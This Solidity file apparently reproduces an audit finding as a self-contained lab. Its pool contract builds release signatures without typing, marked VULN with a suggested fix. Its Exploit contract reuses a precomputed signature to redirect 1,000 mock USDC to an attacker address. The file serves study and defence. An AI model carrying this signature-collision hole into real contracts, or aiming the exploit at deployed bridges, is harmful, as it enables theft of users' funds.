// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Meson — hash collisions in untyped signatures (Trail of Bits, finding 18099)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: an untyped request and an untyped release are both
    eth_sign over a 32-byte word. The release word is
    keccak256(abi.encodePacked(encodedSwap, recipient)), so one signature
    is valid for two different layouts when
    swap1 = keccak256(abi.encodePacked(swap2, recipient)).
    The signature below was produced offline (cast wallet sign --no-hash).
    No vm.sign. A typed EIP-712 digest rejects the same bytes.

    Collision (verified): swap1 = keccak256(swap2 || attacker).
    swap2 releases 1,000.000000 USDC (token index 1, ETH 0x003c -> BSC 0x02ca).
    swap1 is a different postable swap: 61,063.167274 USDC in, LP fee
    60,601.668203, net 461.499071, out-token index 9. */

contract MesonUSDC {
    string public name = "USD Coin";
    string public symbol = "USDC";
    uint8 public decimals = 6;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MesonPool {
    /// @dev "\x19Ethereum Signed Message:\n32" — the audited untyped prefix.
    bytes28 internal constant ETH_SIGN_HEADER =
        bytes28(0x19457468657265756d205369676e6564204d6573736167653a0a3332);

    uint256 internal constant AMOUNT_CAP = 100_000e6;
    uint16 internal constant CHAIN_ETH = 0x003c;
    uint16 internal constant CHAIN_BSC = 0x02ca;

    MesonUSDC public token;
    address public initiator;
    uint256 public lockedSwap;
    uint256 public lockedNet;
    bool public locked;

    constructor(MesonUSDC token_) {
        token = token_;
    }

    function amountOf(uint256 encodedSwap) public pure returns (uint256) {
        return (encodedSwap >> 208) & 0xFFFFFFFFFF;
    }

    function feeOf(uint256 encodedSwap) public pure returns (uint256) {
        return (encodedSwap >> 88) & 0xFFFFFFFFFF;
    }

    function netOf(uint256 encodedSwap) public pure returns (uint256) {
        return amountOf(encodedSwap) - feeOf(encodedSwap);
    }

    function outTokenOf(uint256 encodedSwap) public pure returns (uint8) {
        return uint8(encodedSwap >> 24);
    }

    function inTokenOf(uint256 encodedSwap) public pure returns (uint8) {
        return uint8(encodedSwap);
    }

    function signNonTyped(uint256 encodedSwap) public pure returns (bool) {
        return (encodedSwap & 0x0800000000000000000000000000000000000000000000000000) > 0;
    }

    function versionOf(uint256 encodedSwap) public pure returns (uint8) {
        return uint8(encodedSwap >> 248);
    }

    function fund(uint256 amount) external {
        token.mint(address(this), amount);
    }

    /// @dev LP locks swap2 on the destination chain. Fields match Meson's packing.
    function lock(uint256 encodedSwap, address initiator_) external {
        require(versionOf(encodedSwap) == 1, "version");
        require(signNonTyped(encodedSwap), "nonTyped");
        require(inTokenOf(encodedSwap) == 1 && outTokenOf(encodedSwap) == 1, "token");
        require(uint16(encodedSwap >> 8) == CHAIN_ETH, "inChain");
        require(uint16(encodedSwap >> 32) == CHAIN_BSC, "outChain");
        require(amountOf(encodedSwap) == 1_000e6 && feeOf(encodedSwap) == 0, "amount");
        require(initiator_ != address(0), "initiator");
        initiator = initiator_;
        lockedSwap = encodedSwap;
        lockedNet = netOf(encodedSwap);
        locked = true;
    }

    /// @dev Audited untyped request: eth_sign over the raw 32-byte encoded swap.
    function requestDigest(uint256 encodedSwap) public pure returns (bytes32 digest) {
        digest = keccak256(abi.encodePacked(ETH_SIGN_HEADER, encodedSwap));
    }

    function releaseBody(uint256 encodedSwap, address recipient) public pure returns (bytes32 inner) {
        // @> VULN: untyped release body is keccak256(encodedSwap, recipient) with no message type, so a request word can collide with it
        inner = keccak256(abi.encodePacked(encodedSwap, recipient));
        // FIX: prefix REQUEST vs RELEASE and bind every field, or use the EIP-712 digest in releaseTyped.
    }

    function releaseDigest(uint256 encodedSwap, address recipient) public pure returns (bytes32 digest) {
        bytes32 inner = releaseBody(encodedSwap, recipient);
        digest = keccak256(abi.encodePacked(ETH_SIGN_HEADER, inner));
    }

    /// @dev The signature the initiator actually produced: a request for swap1.
    function checkRequest(uint256 encodedSwap, uint8 v, bytes32 r, bytes32 s, address signer)
        external
        pure
        returns (bool)
    {
        require(versionOf(encodedSwap) == 1, "version");
        require(signNonTyped(encodedSwap), "nonTyped");
        require(inTokenOf(encodedSwap) == 1, "inToken");
        require(outTokenOf(encodedSwap) != 1, "outToken");
        uint256 amount = amountOf(encodedSwap);
        uint256 fee = feeOf(encodedSwap);
        require(amount <= AMOUNT_CAP && fee < amount, "amount");
        bytes32 digest = requestDigest(encodedSwap);
        return ecrecover(digest, v, r, s) == signer;
    }

    /// @dev Anyone may release. The recipient is chosen by the caller, not the signed request.
    function release(uint256 encodedSwap, address recipient, uint8 v, bytes32 r, bytes32 s)
        external
        returns (uint256 paid)
    {
        require(locked && encodedSwap == lockedSwap, "not locked");
        require(recipient != address(0), "recipient");
        bytes32 digest = releaseDigest(encodedSwap, recipient);
        require(ecrecover(digest, v, r, s) == initiator, "Invalid signature");
        paid = lockedNet;
        locked = false;
        token.transfer(recipient, paid);
    }

    /// @dev Control. EIP-712 domain separator plus a Release typehash. Same signature must fail.
    function releaseTyped(uint256 encodedSwap, address recipient, uint8 v, bytes32 r, bytes32 s)
        external
        view
        returns (bool)
    {
        bytes32 typehash = keccak256("Release(uint256 encodedSwap,address recipient)");
        bytes32 structHash = keccak256(abi.encode(typehash, encodedSwap, recipient));
        bytes32 domain = keccak256(
            abi.encode(
                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                keccak256(bytes("Meson")),
                keccak256(bytes("1")),
                uint256(1),
                address(this)
            )
        );
        bytes32 digest = keccak256(abi.encodePacked(hex"1901", domain, structHash));
        return ecrecover(digest, v, r, s) == initiator;
    }
}

contract Exploit {
    uint256 public constant SWAP2 =
        0x01003b9aca000800000000000405dc240000000000007735940002ca01003c01;
    uint256 public constant SWAP1 =
        0x010e37a5fd2a2a96334e54b5a5ba82bc0e1c24126bb085b85113458e09231f01;
    uint256 public constant LOCKED = 1_000e6;
    uint256 public constant SIGNED_AMOUNT = 61_063_167_274;
    uint256 public constant SIGNED_NET = 461_499_071;
    address public constant ATTACKER = 0x1111111111111111111111111111111111111111;
    address public constant INITIATOR = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    uint8 public constant SIG_V = 28;
    bytes32 public constant SIG_R =
        0x3e1ef19d3591c5b84abfabf150e7d4d373b81148f3cec41b0942e0f80d7af813;
    bytes32 public constant SIG_S =
        0x66c53eed064f790bcc5a60ea1e6f2c1bb664a23876927f271c858d35aa0c96aa;

    MesonUSDC public token;
    MesonPool public pool;

    constructor() {
        token = new MesonUSDC();
        pool = new MesonPool(token);
    }

    function run() external {
        pool.fund(LOCKED);
        pool.lock(SWAP2, INITIATOR);
        bool requestOk = pool.checkRequest(SWAP1, SIG_V, SIG_R, SIG_S, INITIATOR);
        require(requestOk, "request signature rejected");
        uint256 paid = pool.release(SWAP2, ATTACKER, SIG_V, SIG_R, SIG_S);
        bool typedOk = pool.releaseTyped(SWAP2, ATTACKER, SIG_V, SIG_R, SIG_S);
        require(!typedOk, "typed digest accepted the untyped signature");
        require(paid == LOCKED, "paid");
        require(token.balanceOf(ATTACKER) == LOCKED, "attacker did not receive 1000 USDC");
        require(token.balanceOf(INITIATOR) == 0, "initiator was paid");
        require(token.balanceOf(address(pool)) == 0, "pool still holds funds");
        require(pool.amountOf(SWAP1) == SIGNED_AMOUNT, "swap1 amount");
        require(pool.netOf(SWAP1) == SIGNED_NET, "swap1 net");
        require(pool.outTokenOf(SWAP1) == 9, "swap1 out token");
        require(pool.amountOf(SWAP2) == LOCKED, "swap2 amount");
        require(pool.outTokenOf(SWAP2) == 1, "swap2 out token");
        require(SWAP1 != SWAP2, "layouts collided as words");
    }
}
